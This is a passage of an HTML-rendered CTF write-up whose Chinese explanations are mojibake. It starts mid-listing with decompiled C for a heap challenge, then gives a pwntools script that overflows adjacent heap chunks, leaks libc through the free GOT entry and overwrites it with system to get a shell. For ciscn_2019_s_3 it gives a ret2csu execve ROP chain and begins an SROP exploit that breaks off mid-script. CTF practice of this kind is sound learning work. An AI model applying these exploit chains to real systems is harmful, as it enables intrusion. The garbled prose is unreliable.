</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>sub_8048724</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int8</span> <span class=n>index</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>v2</span><span class=p>;</span> <span class=c1>// [esp+17h] [ebp-11h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>len</span><span class=p>;</span> <span class=c1>// [esp+18h] [ebp-10h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// [esp+1Ch] [ebp-Ch]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>v4</span> <span class=o>=</span> <span class=n>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>index</span> <span class=o>&lt;</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int8</span><span class=p>)</span><span class=n>total_users</span> <span class=o>&amp;&amp;</span> <span class=n>users</span><span class=p>[</span><span class=n>index</span><span class=p>]</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>len</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;text length:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>__isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%u%c&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>len</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)(</span><span class=n>len</span> <span class=o>+</span> <span class=o>*</span><span class=p>(</span><span class=n>_DWORD</span> <span class=o>*</span><span class=p>)</span><span class=n>users</span><span class=p>[</span><span class=n>index</span><span class=p>])</span> <span class=o>&gt;=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>users</span><span class=p>[</span><span class=n>index</span><span class=p>]</span> <span class=o>-</span> <span class=mi>4</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>puts</span><span class=p>(</span><span class=s>&#34;my l33t defenses cannot be fooled, cya!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;text:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>read_name</span><span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=n>_DWORD</span> <span class=o>*</span><span class=p>)</span><span class=n>users</span><span class=p>[</span><span class=n>index</span><span class=p>],</span> <span class=n>len</span> <span class=o>+</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>)</span> <span class=o>^</span> <span class=n>v4</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>è¿™é‡Œå…¶å®æ˜¯åˆ¤æ–­å½“å‰ <code>user->description</code> åŠ ä¸Šè¾“å…¥çš„å­—ç¬¦ä¸²é•¿åº¦æ˜¯å¦ä¼šè¶…è¿‡ <code>user</code> èµ·å§‹åœ°å€ - 4 çš„ä½ç½®ï¼Œç›®çš„å¾ˆæ˜æ˜¾æ˜¯ä¸ºäº†é˜²æ­¢å †æº¢å‡ºã€‚é¢„æœŸå†…å­˜å¸ƒå±€æ˜¯ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl> --------
</span></span><span class=line><span class=cl>| Desc0  |
</span></span><span class=line><span class=cl> -------- &lt;- user0
</span></span><span class=line><span class=cl>| &amp;Desc0 |
</span></span><span class=line><span class=cl> --------
</span></span><span class=line><span class=cl>| name0  |
</span></span><span class=line><span class=cl> --------
</span></span><span class=line><span class=cl>| Desc1  |
</span></span><span class=line><span class=cl> -------- &lt;- user1
</span></span><span class=line><span class=cl>| &amp;Desc1 |
</span></span><span class=line><span class=cl> --------
</span></span><span class=line><span class=cl>| name1  |
</span></span><span class=line><span class=cl> --------
</span></span><span class=line><span class=cl>| Desc2  |
</span></span><span class=line><span class=cl> -------- &lt;- user2
</span></span><span class=line><span class=cl>| &amp;Desc2 |
</span></span><span class=line><span class=cl> --------
</span></span><span class=line><span class=cl>| name2  |
</span></span><span class=line><span class=cl> --------
</span></span></code></pre></td></tr></table></div></div><p>ç„¶è€Œï¼Œæˆ‘ä»¬è¿˜æ‹¥æœ‰åˆ é™¤ç”¨æˆ·çš„åŠŸèƒ½ã€‚å‡å¦‚æˆ‘ä»¬åˆ é™¤ç¬¬ 0 ä¸ªç”¨æˆ·ï¼Œé‚£ä¹ˆä»–æ‹¥æœ‰çš„ç©ºé—´å°±è¢« <code>free()</code> äº†ã€‚è¿™æ—¶æˆ‘ä»¬æ–°å¢ç”¨æˆ·ï¼Œç”±äº <code>desc</code> é•¿åº¦å¯æ§ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶å…¶é•¿åº¦è®©å®ƒæ°å¥½åˆ†é…åˆ°åŸæ¥ç¬¬ 0 ä¸ªç”¨æˆ·çš„ç©ºé—´ï¼Œä» <code>Desc0</code> ä¸€ç›´åˆ° <code>name0</code> ç»“æŸã€‚é‚£ä¹ˆæ­¤æ—¶ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl> --------
</span></span><span class=line><span class=cl>|        |
</span></span><span class=line><span class=cl>|        |
</span></span><span class=line><span class=cl>| Desc3  |
</span></span><span class=line><span class=cl>|        |
</span></span><span class=line><span class=cl>|        |
</span></span><span class=line><span class=cl> --------
</span></span><span class=line><span class=cl>| Desc1  |
</span></span><span class=line><span class=cl> -------- &lt;- user1
</span></span><span class=line><span class=cl>| &amp;Desc1 |
</span></span><span class=line><span class=cl> --------
</span></span><span class=line><span class=cl>| name1  |
</span></span><span class=line><span class=cl> --------
</span></span><span class=line><span class=cl>| Desc2  |
</span></span><span class=line><span class=cl> -------- &lt;- user2
</span></span><span class=line><span class=cl>| &amp;Desc2 |
</span></span><span class=line><span class=cl> --------
</span></span><span class=line><span class=cl>| name2  |
</span></span><span class=line><span class=cl> -------- &lt;- user3
</span></span><span class=line><span class=cl>| &amp;Desc3 |
</span></span><span class=line><span class=cl> --------
</span></span><span class=line><span class=cl>| name3  |
</span></span><span class=line><span class=cl> --------
</span></span></code></pre></td></tr></table></div></div><p>ä¸éš¾å‘ç°ï¼Œå³ä½¿æœ‰ä¸Šè¿°é˜²æŠ¤æªæ–½çš„é™åˆ¶ï¼Œæˆ‘ä»¬ä¾ç„¶å¯ä»¥æº¢å‡ºåˆ° <code>user1</code> å¹¶è¦†ç›–å…¶ä¸­æ•°æ®ã€‚å¦‚æœæŠŠ libc ä¸­å‡½æ•°çš„ GOT è¡¨åœ°å€æ”¾è¿›å»ï¼Œç„¶å <code>display</code> å‡½æ•°æ‰“å°å‡ºæ¥ï¼Œå°±èƒ½æ³„éœ² libc åœ°å€ã€‚ç„¶åè¿›è¡Œ GOT åŠ«æŒå³å¯ getshellã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸Šå›¾ä¸­ <code>Desc1</code> å‰å’Œ <code>&Desc1</code> å‰éƒ½æœ‰ 8 å­—èŠ‚ chunk headerï¼Œè¦†ç›–æ—¶éœ€è¦è€ƒè™‘å®ƒä»¬å çš„ 16Bã€‚æ­¤å¤–ï¼Œ<code>Desc0+user0</code> åŸæœ¬æ‰€å çš„ç©ºé—´å®é™…ä¸Šæ˜¯ <code>0x8+0x80+0x8+0x80</code>ï¼Œè€Œ <code>Desc3</code> ç”³è¯· <code>0x100</code> å­—èŠ‚æ—¶å®é™…å  <code>0x8+0x100</code>ï¼Œå‰è€…æ¯”åè€…å¤šå‡ºç©ºé—²çš„ <code>0x8</code> å­—èŠ‚ï¼Œä¹Ÿéœ€è¦è€ƒè™‘ã€‚å› æ­¤è®¡ç®—åç§» <code>0x100+0x8+0x8+0x80+0x8=0x198</code>ã€‚</p><p>æ”¾ä¸Š <code>0x198</code> å­—èŠ‚çš„ padding åï¼Œå°±å¯ä»¥æŠŠ <code>free</code> çš„ GOT åœ°å€æ”¾åœ¨ <code>&Desc1</code> å¤„ï¼Œæ­¤æ—¶æ‰“å°å‡ºæ¥çš„å°±æ˜¯ <code>free</code> çš„ GOT åœ°å€ï¼Œä»è€Œæ³„éœ²å‡º libcã€‚è¿™æ—¶å†åˆ©ç”¨æ›´æ–°åŠŸèƒ½ç”¨ <code>system.plt</code> è¦†ç›– <code>free.got</code>ï¼Œé‚£ä¹ˆæ‰§è¡Œ <code>free</code> æ—¶å°±ä¼šæ‰§è¡Œ <code>system</code>ã€‚æ­¤æ—¶è¿˜å·®ä¸€ä¸ªå‚æ•° <code>/bin/sh</code>ï¼Œæˆ‘ä»¬ä¸å¦¨æ”¾åœ¨ <code>Desc2</code> å¤„ï¼Œé‚£ä¹ˆåœ¨åˆ é™¤ <code>user2</code> æ—¶ï¼Œæœ‰æºç ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>delete</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int8</span> <span class=n>index</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v2</span><span class=p>;</span> <span class=c1>// [esp+1Ch] [ebp-Ch]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>v2</span> <span class=o>=</span> <span class=n>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>index</span> <span class=o>&lt;</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int8</span><span class=p>)</span><span class=n>total_users</span> <span class=o>&amp;&amp;</span> <span class=n>users</span><span class=p>[</span><span class=n>index</span><span class=p>]</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=kt>void</span> <span class=o>**</span><span class=p>)</span><span class=n>users</span><span class=p>[</span><span class=n>index</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=n>users</span><span class=p>[</span><span class=n>index</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=n>users</span><span class=p>[</span><span class=n>index</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>)</span> <span class=o>^</span> <span class=n>v2</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>è¿™é‡Œå°±ä¼šæ‰§è¡Œ <code>free(address of /bin/sh)</code>ï¼Œå®é™…ä¸Šå°±æ˜¯ <code>system('/bin/sh')</code>ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>max_len</span><span class=p>,</span> <span class=n>desc_len</span><span class=p>,</span> <span class=n>text</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Action:&#39;</span><span class=p>,</span> <span class=s1>&#39;0&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;description:&#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>max_len</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;name:&#39;</span><span class=p>,</span> <span class=s1>&#39;aaaa&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;length:&#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>desc_len</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;text:&#39;</span><span class=p>,</span> <span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delete</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Action:&#39;</span><span class=p>,</span> <span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;index:&#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>display</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Action:&#39;</span><span class=p>,</span> <span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;index:&#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>update</span><span class=p>(</span><span class=n>index</span><span class=p>,</span> <span class=n>desc_len</span><span class=p>,</span> <span class=n>text</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Action:&#39;</span><span class=p>,</span> <span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;index:&#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;length:&#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>desc_len</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;text:&#39;</span><span class=p>,</span> <span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x80</span><span class=p>,</span><span class=mh>0x80</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x80</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x80</span><span class=p>,</span><span class=mh>0x80</span><span class=p>,</span><span class=s1>&#39;b&#39;</span><span class=o>*</span><span class=mh>0x80</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x8</span><span class=p>,</span><span class=mh>0x8</span><span class=p>,</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x100</span><span class=p>,</span><span class=mh>0x19c</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x198</span><span class=o>+</span><span class=n>p32</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;free&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=n>display</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;tion:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span> <span class=o>=</span> <span class=n>u32</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;free&#39;</span><span class=p>,</span><span class=n>free</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>system</span><span class=p>,</span><span class=n>binsh</span> <span class=o>=</span> <span class=n>ret2libc</span><span class=p>(</span><span class=n>free</span><span class=p>,</span><span class=s1>&#39;free&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>update</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>4</span><span class=p>,</span><span class=n>p32</span><span class=p>(</span><span class=n>system</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=ciscn_2019_s_3>ciscn_2019_s_3</h3><p>æœ¬é¢˜ä»£ç å¾ˆå°‘ï¼Œæ³¨æ„åˆ° <code>gadgets</code> å‡½æ•°ä¸­æœ‰ <code>mov rax, 0Fh</code> å’Œ <code>mov rax, 3Bh</code> å¯ä»¥æ§åˆ¶ <code>rax</code>ï¼Œå®ƒä»¬æ°å¥½åˆ†åˆ«å¯¹åº”ç³»ç»Ÿè°ƒç”¨ <code>sigreturn</code> å’Œ <code>execve</code>ã€‚å› æ­¤æœ¬é¢˜å¯ä»¥å›´ç»•è¿™ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ç»™å‡ºä¸¤ç§åšæ³•ã€‚</p><p>æ¯”è¾ƒéš¾çš„åšæ³•æ˜¯åˆ©ç”¨ <code>execve</code>ï¼Œæˆ‘ä»¬å¸Œæœ›æ‰§è¡Œ <code>execve('/bin/sh',0,0)</code>ï¼Œé‚£ä¹ˆè¿˜éœ€è¦æ§åˆ¶ <code>rdi,rsi,rdx</code>ã€‚è¿™é‡Œéœ€è¦å‡ ä¸ª gadgetsï¼Œä½†æ˜¯ <code>gadgets</code> å‡½æ•°ä¸­çš„ä¸å¤Ÿç”¨ï¼Œæ‰€ä»¥å¯ä»¥ <code>ret2csu</code>ã€‚<code>/bin/sh</code> éœ€è¦æˆ‘ä»¬è‡ªå·±å†™ï¼Œä½†åªèƒ½å†™åˆ°æ ˆä¸Šï¼Œå› æ­¤éœ€è¦é€šè¿‡ <code>write</code> æ³„éœ²æ ˆåœ°å€ã€‚</p><p>æˆ‘ä»¬è¾“å…¥çš„å†…å®¹ä½äº <code>rbp-0x10</code>ï¼Œé‚£ä¹ˆå¡«å…… 16 å­—èŠ‚åå¡«å…… <code>main</code> å‡½æ•°åœ°å€å³å¯é‡å¯ç¨‹åºåŒæ—¶æ³„éœ²æ ˆåœ°å€ï¼Œgdb è°ƒè¯•å¯çŸ¥æ³„éœ²ä½ç½®è·ç¦»æˆ‘ä»¬çš„è¾“å…¥åç§»é‡ä¸º <code>0x118</code> å­—èŠ‚ã€‚</p><p>æœ€ååœ¨æ ˆä¸Šå¸ƒç½®å¥½ <code>/bin/sh</code> å­—ç¬¦ä¸²å’Œ <code>pop_rdi</code> çš„ gadgetï¼Œå‡†å¤‡å¥½ <code>rax</code>ï¼Œè¿”å›åˆ° csu æœ«å°¾ç¡®ä¿ <code>rbx=0</code> ä¸” <code>rbp=1</code>ï¼Œå°†æ ˆä¸Š <code>pop rdi</code> çš„åœ°å€ç»™ <code>r12</code> ä»¥ä¾¿è°ƒç”¨ï¼Œéšåè®¾ç½® <code>rsi,rdx</code> ä¸º 0ï¼Œæœ€åå°† <code>/bin/sh</code> çš„åœ°å€ç»™ <code>rdi</code>ï¼Œè°ƒç”¨ <code>syscall</code> å³å¯ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>syscall</span> <span class=o>=</span> <span class=mh>0x400517</span>
</span></span><span class=line><span class=cl><span class=n>mov_rax_3b</span> <span class=o>=</span> <span class=mh>0x4004e2</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdi</span> <span class=o>=</span> <span class=mh>0x4005a3</span>
</span></span><span class=line><span class=cl><span class=n>csu_1</span> <span class=o>=</span> <span class=mh>0x400580</span>
</span></span><span class=line><span class=cl><span class=n>csu_2</span> <span class=o>=</span> <span class=mh>0x40059a</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>16</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;main&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=p>(</span><span class=mh>0x20</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>stack</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span><span class=o>-</span><span class=mh>0x118</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;stack&#39;</span><span class=p>,</span><span class=n>stack</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>pop_rdi</span><span class=p>,</span><span class=n>mov_rax_3b</span><span class=p>,</span><span class=n>csu_2</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=n>stack</span><span class=o>-</span><span class=mh>0x18</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>csu_1</span><span class=p>,</span><span class=n>pop_rdi</span><span class=p>,</span><span class=n>stack</span><span class=o>-</span><span class=mh>0x20</span><span class=p>,</span><span class=n>syscall</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>ç¬¬äºŒç§æ–¹æ³•åˆ™æ˜¯ SROPã€‚æˆ‘ä»¬åˆ©ç”¨ <code>mov rax, 0Fh</code> æ§åˆ¶ <code>rax</code> ä¸º 15ï¼Œéšåè°ƒç”¨ <code>syscall</code>ï¼Œç›¸å½“äºæ‰§è¡Œäº†ä¸€æ¬¡ <code>sigreturn</code>ã€‚å¯ä»¥ä¼ªé€  sigreturn frame æ¥æ‰§è¡Œ <code>execve('/bin/sh',0,0)</code>ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>syscall</span> <span class=o>=</span> <span class=mh>0x400517</span>
</span></span><span class=line><span class=cl><span class=n>mov_rax_0f</span> <span class=o>=</span> <span class=mh>0x4004da</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>16</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;vuln&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=p>(</span><span class=mh>0x20</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>stack</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>r</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span><span class=o>-</span><span class=mh>0x118</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;stack&#39;</span><span class=p>,</span><span class=n>stack</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>frame</span> <span class=o>=</span> <span class=n>SigreturnFrame</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rax</span> <span class=o>=</span> <span class=n>constants</span><span class=o>.</span><span class=n>SYS_execve</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rdi</span> <span class=o>=</span> <span class=n>stack</span>
